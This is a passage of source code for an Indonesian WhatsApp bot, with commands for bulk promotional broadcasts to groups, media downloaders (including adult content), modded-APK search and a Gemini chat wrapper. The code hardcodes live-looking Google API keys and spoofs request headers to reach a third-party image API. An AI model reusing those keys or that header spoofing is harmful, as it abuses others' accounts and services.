                  id: '.buyjasajpm'
                },
                {
                  title: 'Topup Saldo Ewallet',
                  id: '.topupsaldo'
                },
                {
                  title: 'Topup Diamonds',
                  id: '.topupdiamond'
                }, 
                {
                  title: 'Topup Pulsa',
                  id: '.isipulsa'
                }          
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await XPanz.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'carigc': {
    if (!text) return ArroganzzReply("📌 *Cara Penggunaan:*\n.carigc [keyword]\n\nContoh:\n.carigc anime");

    let results = await cariGC(text);
    if (results.length === 0) return ArroganzzReply("❌ Tidak ditemukan grup dengan kata kunci tersebut!");

    let messages = `🔍 *Hasil Pencarian Grup WhatsApp:*\n\n`;
    results.slice(0, 5).forEach((gc, i) => {
        messages += `📌 *${gc.title}*\n🔗 ${gc.link}\n📖 ${gc.desc}\n\n`;
    });

    return ArroganzzReply(messages);
}
break

case "play": {
if (!text) return ArroganzzReply(example("dj tiktok"))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytmp3(res.url)
if (anu.audio) {
let urlMp3 = anu.audio
await XPanz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return ArroganzzReply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playspotify": case "plays": case "playsp": {
if (!text) return ArroganzzReply(example("intro ariana"))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})

var anu = await fetchJson("https://restapi.simplebot.my.id/api/download/playspotify?q="+text)

if (anu.result.download.link) {
let urlMp3 = anu.result.download.link
await XPanz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: anu.result.metadata.cover_url, title: anu.result.metadata.title, body: `Author ${anu.result.metadata.artists} || Duration ${anu.result.metadata.duration}`, sourceUrl: anu.result.metadata.link, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return ArroganzzReply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playvid": {
if (!text) return ArroganzzReply(example("dj tiktok"))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytmp4(res.url)
if (anu.video) {
let urlMp3 = anu.video
await XPanz.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return ArroganzzReply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return ArroganzzReply(example('we dont talk'))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await ArroganzzReply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sfile": {
if (!text) return ArroganzzReply(example('script bot whatsapp'))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/sfile?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Link :* ${res.link}\n\n`
}
await ArroganzzReply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "xnxx": {
if (!text) return ArroganzzReply(example('step sister'))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/xnxx?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Info :* ${res.info}
* *Link :* ${res.link}\n\n`
}
await ArroganzzReply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "npm": case "npmsearch": {
if (!text) return ArroganzzReply(example('axios'))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/npm?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* ${res.title}
* ${res.update.split("T")[0]}
* ${res.links.npm}\n\n`
}
await ArroganzzReply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "playstore": {
if (!text) return ArroganzzReply(example('alight motion'))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await fetchJson(`https://restapi-v2.simplebot.my.id/search/playstore?q=${text}`)
const anuan = ytsSearch.result
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.nama}
* *Developer :* ${res.developer}
* *Rating :* ${res.rate}
* *Link :* ${res.link}\n\n`
}
await ArroganzzReply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gimage": {
if (!text) return ArroganzzReply(example("anime dark"))
await XPanz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pint = await fetchJson(`https://restapi-v2.simplebot.my.id/search/gimage?q=${text}`)
let pin = pint.result
if (pin.length > 5) await pin.splice(0, 6)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
try {
let imgsc = await prepareWAMessageMedia({ image: {url: a.url}}, { upload: XPanz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
} catch {}
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *google*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await XPanz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp3": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith("https://")) return ArroganzzReply("Link Tautan Tidak Valid")
var anu = await ytmp3(text)
if (anu.audio) {
let urlMp3 = anu.audio
await XPanz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return ArroganzzReply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "block": case "blok": {
if (!isCreator) return ArroganzzReply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return ArroganzzReply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await XPanz.updateBlockStatus(mem, "block")
if (m.isGroup) XPanz.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp4": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith("https://")) return ArroganzzReply("Link Tautan Tidak Valid")
var anu = await ytmp4(text)
if (anu.video) {
let urlMp3 = anu.video
await XPanz.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return ArroganzzReply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokmp3": case "ttmp3": case "ttaudio": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith('https://')) return ArroganzzReply("Link tautan tidak valid")
await tiktokDl(text).then(async (res) => {
if (!res.status) return ArroganzzReply("Error! Result Not Found")
await XPanz.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => ArroganzzReply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "spotify": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith('https://')) return ArroganzzReply("Link tautan tidak valid")
await fetchJson(`https://restapi.simplebot.my.id/api/download/spotify?url=${text}`).then(async (res) => {
if (!res.status) return ArroganzzReply("Error! Result Not Found")
await XPanz.sendMessage(m.chat, {audio: {url: res.result}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => ArroganzzReply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "apkmod": {
if (!text) return ArroganzzReply(example("capcut"))
await fetchJson(`https://restapi-v2.simplebot.my.id/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.url}\n`
}
ArroganzzReply(teks)
XPanz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => ArroganzzReply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "instagram": case "igdl": case "ig": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith('https://')) return ArroganzzReply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/instagram?url=${text}`).then(async (res) => {
if (!res.status) return ArroganzzReply("Error! Result Not Found")
if (res.result.downloadUrls.length > 1) {
for (let i of res.result.downloadUrls) {
await XPanz.sendMessage(m.chat, {image: {url: i}, caption: "*Instagram Downloader ✅*"}, {quoted: m})
}
} else {
await XPanz.sendMessage(m.chat, {video: {url: res.result.downloadUrls[0]}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
}
}).catch((e) => ArroganzzReply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'animbrat-vid': {
    if (!text) return ArroganzzReply('Masukkan teks untuk stiker.');
  const axios = require('axios')
  const { createCanvas, loadImage, registerFont } = require('canvas')
  const sharp = require('sharp')
    try {
        let imageUrl = 'https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg';
        let fontUrl = 'https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf';
        let imagePath = path.join(__dirname, 'session', 'file.jpg');
        let fontPath = path.join(__dirname, 'session', 'NotoColorEmoji.ttf');
        let outputMp4 = path.join(__dirname, 'session', `output_${Date.now()}.mp4`);
        let outputWebP = path.join(__dirname, 'session', `animated_${Date.now()}.webp`);
        let frameDir = path.join(__dirname, 'session', `frames_${Date.now()}`);

        if (!fs.existsSync(frameDir)) fs.mkdirSync(frameDir);

        if (!fs.existsSync(fontPath)) {
            let fontData = await axios.get(fontUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(fontPath, Buffer.from(fontData.data));
        }

        let response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(imagePath, Buffer.from(response.data));

        let baseImage = await loadImage(imagePath);
        let canvas = createCanvas(baseImage.width, baseImage.height);
        let ctx = canvas.getContext('2d');

        require('canvas').registerFont(fontPath, { family: 'EmojiFont' });

        let boardX = canvas.width * 0.22;
        let boardY = canvas.height * 0.50;
        let boardWidth = canvas.width * 0.56;
        let boardHeight = canvas.height * 0.25;

        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        let maxFontSize = 32;
        let minFontSize = 12;
        let fontSize = maxFontSize;

        function isTextFit(text, fontSize) {
            ctx.font = `bold ${fontSize}px EmojiFont`;
            let words = text.split(' ');
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + ' ' + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = words[i];
                } else {
                    currentLine = testLine;
                }
            }
            lines.push(currentLine);
            let textHeight = lines.length * lineHeight;
            return textHeight <= boardHeight * 0.9;
        }

        while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
            fontSize -= 2;
        }

        ctx.font = `bold ${fontSize}px EmojiFont`;

        let words = text.split(' ');
        let lineHeight = fontSize * 1.2;
        let maxWidth = boardWidth * 0.9;
        let frames = [];

        for (let i = 1; i <= words.length; i++) {
            let tempText = words.slice(0, i).join(' ');
            let frameCanvas = createCanvas(baseImage.width, baseImage.height);
            let frameCtx = frameCanvas.getContext('2d');

            frameCtx.drawImage(baseImage, 0, 0, frameCanvas.width, frameCanvas.height);
            frameCtx.fillStyle = '#000';
            frameCtx.textAlign = 'center';
            frameCtx.textBaseline = 'middle';
            frameCtx.font = `bold ${fontSize}px EmojiFont`;

            let lines = [];
            let currentLine = '';
            tempText.split(' ').forEach((word) => {
                let testLine = currentLine ? currentLine + ' ' + word : word;
                let testWidth = frameCtx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = word;
                } else {
                    currentLine = testLine;
                }
            });
            lines.push(currentLine);

            let startY = boardY + boardHeight / 2 - (lines.length - 1) * lineHeight / 2;
            lines.forEach((line, index) => {
                frameCtx.fillText(line, boardX + boardWidth / 2, startY + index * lineHeight);
            });

            let framePath = path.join(frameDir, `frame${i}.png`);
            fs.writeFileSync(framePath, frameCanvas.toBuffer('image/png'));
            frames.push(framePath);
        }

        exec(`ffmpeg -y -framerate 2 -i ${frameDir}/frame%d.png -c:v libx264 -pix_fmt yuv420p ${outputMp4}`, async (err) => {
            if (err) {
                console.error("❌ Error membuat video:", err);
                return ArroganzzReply("Terjadi kesalahan saat membuat video animasi.");
            }

            exec(`ffmpeg -i ${outputMp4} -vf "scale=512:512:flags=lanczos,format=rgba" -loop 0 -preset default -an -vsync 0 ${outputWebP}`, async (err) => {
                if (err) {
                    console.error("❌ Error konversi video ke stiker:", err);
                    return ArroganzzReply("Terjadi kesalahan saat mengonversi video ke stiker.");
                }

                XPanz.sendMessage(m.chat, { sticker: { url: outputWebP } }, { quoted: m });

                setTimeout(() => {
                    fs.unlinkSync(imagePath);
                    fs.unlinkSync(outputMp4);
                    fs.unlinkSync(outputWebP);
                    fs.rmSync(frameDir, { recursive: true, force: true });
                }, 5000);
            });
        });

    } catch (e) {
        console.error(e);
        ArroganzzReply('⚠️ Terjadi kesalahan saat membuat stiker.');
    }
}
break
        
case 'animbratimg': {
    if (!text) return ArroganzzReply('Masukkan teks untuk stiker.');

    try {
        let imageUrl = 'https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg';
        let fontUrl = 'https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf';
        let imagePath = path.join(__dirname, 'session', 'file.jpg');
        let outputPath = path.join(__dirname, 'session', 'file.webp');
        let fontPath = path.join(__dirname, 'session', 'NotoColorEmoji.ttf');


        if (!fs.existsSync(fontPath)) {
            let fontData = await axios.get(fontUrl, { responseType: 'arraybuffer' });
            fs.writeFileSync(fontPath, Buffer.from(fontData.data));
        }

        let response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
        fs.writeFileSync(imagePath, Buffer.from(response.data));

        let baseImage = await loadImage(imagePath);
        let canvas = createCanvas(baseImage.width, baseImage.height);
        let ctx = canvas.getContext('2d');

        ctx.drawImage(baseImage, 0, 0, canvas.width, canvas.height);


        require('canvas').registerFont(fontPath, { family: 'EmojiFont' });

        let boardX = canvas.width * 0.22;
        let boardY = canvas.height * 0.50;
        let boardWidth = canvas.width * 0.56;
        let boardHeight = canvas.height * 0.25;

        ctx.fillStyle = '#000';
        ctx.textAlign = 'center';
        ctx.textBaseline = 'middle';

        let maxFontSize = 32;
        let minFontSize = 12;
        let fontSize = maxFontSize;

        function isTextFit(text, fontSize) {
            ctx.font = `bold ${fontSize}px EmojiFont`;
            let words = text.split(' ');
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + ' ' + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                    lines.push(currentLine);
                    currentLine = words[i];
                } else {
                    currentLine = testLine;
                }
            }
            lines.push(currentLine);
            let textHeight = lines.length * lineHeight;
            return textHeight <= boardHeight * 0.9;
        }

        while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
            fontSize -= 2;
        }

        ctx.font = `bold ${fontSize}px EmojiFont`;

        let words = text.split(' ');
        let lineHeight = fontSize * 1.2;
        let maxWidth = boardWidth * 0.9;
        let lines = [];
        let currentLine = words[0];

        for (let i = 1; i < words.length; i++) {
            let testLine = currentLine + ' ' + words[i];
            let testWidth = ctx.measureText(testLine).width;
            if (testWidth > maxWidth) {
                lines.push(currentLine);
                currentLine = words[i];
            } else {
                currentLine = testLine;
            }
        }
        lines.push(currentLine);
        let startY = boardY + boardHeight / 2 - (lines.length - 1) * lineHeight / 2;
        lines.forEach((line, i) => {
            ctx.fillText(line, boardX + boardWidth / 2, startY + i * lineHeight);
        });

        let buffer = canvas.toBuffer('image/jpeg');
        fs.writeFileSync(imagePath, buffer);
        await sharp(imagePath).toFormat('webp').toFile(outputPath);

        XPanz.sendMessage(m.chat, { 
            sticker: { url: outputPath } 
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        ArroganzzReply('⚠️ Terjadi kesalahan saat membuat stiker.');
    }
}
break

case 'animebrat':
if (!text) return ArroganzzReply(`Example: .animebrat Aku Anak Sigma 🤫🧏`);
try {
let caption = `Silahkan pilih tipe yang diinginkan:\n\n1. *Gambar 🖼️*\n2. *Video 🎥*`;
XPanz.sendMessage(m.chat, {
text: caption,
footer: `© Arroganzz - Botz`,
buttons: [
{
buttonId: `.animbratimg ${text}`,
buttonText: { displayText: "Gambar 🖼️" }
},
{
buttonId: `.animbrat-vid ${text}`,
buttonText: { displayText: "Video 🎥" }
}
],
viewOnce: true,
}, { quoted: m });
} catch (err) {
console.error(err);
ArroganzzReply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
}
break

case "doodstream": case "dood": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith('https://')) return ArroganzzReply("Link tautan tidak valid")
try {
let res = await Buddy(`${text}`)
await XPanz.sendMessage(m.chat, {video: {url: res.response.gif.url}, mimetype: "video/mp4", caption: "*Doodstream Downloader ✅*"}, {quoted: m})
} catch (err) {
console.log(err)
ArroganzzReply("Error result not found")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "terabox": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith('https://')) return ArroganzzReply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/terabox?url=${text}`).then(async (res) => {
if (!res.status) return ArroganzzReply("Error! Result Not Found")
await XPanz.sendMessage(m.chat, {document: {url: res.result}, mimetype: "application/zip", fileName: "Terabox.zip", caption: "*Terabox Downloader ✅*"}, {quoted: m})

}).catch((e) => ArroganzzReply("Error link tautan tidak didukung"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'gemini': {
    if (!text && !m.quoted) return ArroganzzReply("• *Contoh:* .gemini selamat pagi");
    const { uploadFile } = require('cloudku-uploader');
    const { Buffer } = require('buffer');
    const { GoogleGenerativeAI } = require ("@google/generative-ai");
    const genAI = new GoogleGenerativeAI("AIzaSyDvJL8ONZ5RGqkQ5zLGm4vMWoIfHIrAgAk");
    const geminiProModel = genAI.getGenerativeModel({ model: "gemini-2.5-pro" });
    const geminiFlashModel = genAI.getGenerativeModel({ model: "gemini-2.0-flash" });
   async function generateImage(prompt) {
  try {
    let { data } = await axios.post("https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev", {
      prompt,
      size: "1024x1024",
      device_id: `dev-${Math.floor(Math.random() * 1000000)}`
    }, {
      headers: {
        "Content-Type": "application/json",
        Origin: "https://deepimg.ai",
        Referer: "https://deepimg.ai/"
      }
    })
    return data?.data?.images?.[0]?.url || null
  } catch (err) {
    console.error(err.response ? err.response.data : err.message)
    return null
  }
}

function checkText(text) {
    const lowerCaseText = text.toLowerCase();
    if (lowerCaseText.includes('gambar') || lowerCaseText.includes('gambar') || lowerCaseText.includes('gambarkan')) {
      return 'ok';
    } else {
      return 'no';
    }
  }
  async function findSong(text) {
      const natural = require('natural');
    const tokenizer = new natural.WordTokenizer();
    const tokens = tokenizer.tokenize(text.toLowerCase());

    const keywords = ['gambar', 'gambarkan'];
    const songKeywords = tokens.filter(token => keywords.includes(token));

    if (songKeywords.length === 0) {
        return "Maaf, tidak dapat menemukan permintaan image dalam teks tersebut.";
    }

    let songTitle = tokens.slice(tokens.indexOf(songKeywords[0]) + 1).join(' ');

    return songTitle
}

const natural = require('natural');

async function findImage(text) {
    const tokenizer = new natural.WordTokenizer();
    const tokens = tokenizer.tokenize(text.toLowerCase());

    const imageKeywords = ['ubah', 'ubahlah'];

    const foundImageKeywordIndex = tokens.findIndex(token => imageKeywords.includes(token));

    if (foundImageKeywordIndex !== -1) {
        let imageQueryTokens = tokens.slice(foundImageKeywordIndex + 1).filter(token => !imageKeywords.includes(token));
        let imageQuery = imageQueryTokens.join(' ');
        return { type: 'image', query: imageQuery };
    } else {
        return null;
    }
}


const searchGambar = await findImage(m.text)
if (searchGambar) {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  if (!mime) return ArroganzzReply(`Kirim/reply gambar dengan caption *${usedPrefix + command}* prompt`);
  if (!/image\/(jpe?g|png)/.test(mime)) return ArroganzzReply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
  
  let promptText = searchGambar.query;
  
  ArroganzzReply("*gemini memproses nya tunggu beberapa menit..*");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyBTYmAq0pz2yhptuGQtaemr2b6afY8HNBA");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "tmp", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await XPanz.sendMessage(m.chat, { 
        image: { url: tempPath },
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      ArroganzzReply("Gagal menghasilkan gambar.");
    }
  } catch (error) {
    console.error(error);
    ArroganzzReply(`Error: ${error.message}`);
  }
}  else if (checkText(text) === 'ok') {
    const natural = require('natural');
 async function findSong(text) {
    const tokenizer = new natural.WordTokenizer();
    const tokens = tokenizer.tokenize(text.toLowerCase());

    const keywords = ['gambar', 'gambarkan'];
    const songKeywords = tokens.filter(token => keywords.includes(token));

    if (songKeywords.length === 0) {
        return "Maaf, tidak dapat menemukan permintaan image dalam teks tersebut.";
    }

    let songTitle = tokens.slice(tokens.indexOf(songKeywords[0]) + 1).join(' ');

    return songTitle
}

      const tit = await findSong(text)

        ArroganzzReply("Sedang memproses gambar, mohon tunggu...")

  let imageUrl = await generateImage(tit)
  if (!imageUrl) return ArroganzzReply("gagal membuat gambarnya coba ganti prompt nya")

  await XPanz.sendMessage(m.chat, { 
    image: { url: imageUrl }, 
    caption: `Gambar berhasil dibuat!\n Dengan Prompt: ${tit}` 
  }, { quoted: m })     
    
    } else {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || "";
    let prompt = text || (m.quoted && m.quoted.text) || "";

    try {
        let responseText, imageUrl;

        if (mime) {
            // Proses upload gambar ke CloudkuImages
            let fileBuffer = await q.download();
            let ext = mime.split('/')[1] || 'bin';
            let fileName = `upload.${ext}`;

            let uploadResult = await uploadFile(fileBuffer, fileName);
            if (uploadResult.status !== "success") return ArroganzzReply("⚠️ Gagal mengunggah gambar!");

            imageUrl = uploadResult.url;

            // Proses AI dengan gambar
            const imageResp = await fetch(imageUrl).then(res => res.arrayBuffer());
            const imageBase64 = Buffer.from(imageResp).toString("base64");

            let imagePart = {
                inlineData: {
                    data: imageBase64,
                    mimeType: mime
                }
            };

            let result = await geminiProModel.generateContent([imagePart, prompt]);
            responseText = result.response.text();
        } else {
            // Proses teks biasa
            let result = await geminiFlashModel.generateContent(prompt);
            responseText = result.response.text();
        }

        if (!responseText) throw new Error("Response tidak valid dari API");

        XPanz.sendMessage(m.chat, {
            text: responseText,
            contextInfo: {
                externalAdReply: {
                    title: 'GEMINI - VISION',
                    thumbnailUrl: imageUrl || 'https://files.catbox.moe/iwsh9t.jpg',
                    sourceUrl: 'https://gemini.google.com',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        ArroganzzReply("⚠️ Terjadi kesalahan saat memproses permintaan.");
    }
        }
}
break;
 
case "facebook": case "fb": case "fbdl": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith('https://')) return ArroganzzReply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/facebook?url=${text}`).then(async (res) => {
if (!res.status) return ArroganzzReply("Error! Result Not Found")
return XPanz.sendMessage(m.chat, {video: {url: res.result.media.video_hd || res.result.media.video_sd}, mimetype: "video/mp4", caption: "*Facebook Downloader ✅*"}, {quoted: m})
}).catch((e) => ArroganzzReply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "capcut": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith('https://')) return ArroganzzReply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return ArroganzzReply("Error! Result Not Found")
await XPanz.sendMessage(m.chat, {video: {url: res.result.videoUrl}, mimetype: "video/mp4", caption: "*Capcut Downloader ✅*"}, {quoted: m})
}).catch((e) => ArroganzzReply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "xnxxdl": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith('https://')) return ArroganzzReply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/xnxx?url=${text}`).then(async (res) => {
if (!res.status) return ArroganzzReply("Error! Result Not Found")
await XPanz.sendMessage(m.chat, {video: {url: res.result.files.hight || res.result.files.low}, mimetype: "video/mp4", caption: "*XNXX Downloader ✅*"}, {quoted: m})
}).catch((e) => ArroganzzReply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gitclone": {
if (!text) return ArroganzzReply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return ArroganzzReply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    XPanz.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await ArroganzzReply(`Error! repositori tidak ditemukan`)
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "googledrive": case "gdrive": {
if (!text) return ArroganzzReply(example("linknya"))
if (!text.startsWith("https://")) return ArroganzzReply(example("linknya"))
try {
    const res = await fetchJson(`https://restapi-v2.simplebot.my.id/download/gdrive?url=${text}`)
   await XPanz.sendMessage(m.chat, { document: { url: res.result.downloadUrl }, mimetype: res.result.mimetype, fileName: `${res.result.fileName}`}, { quoted : m })
} catch (e) {
await ArroganzzReply(`Error! result tidak ditemukan`)
}}
break

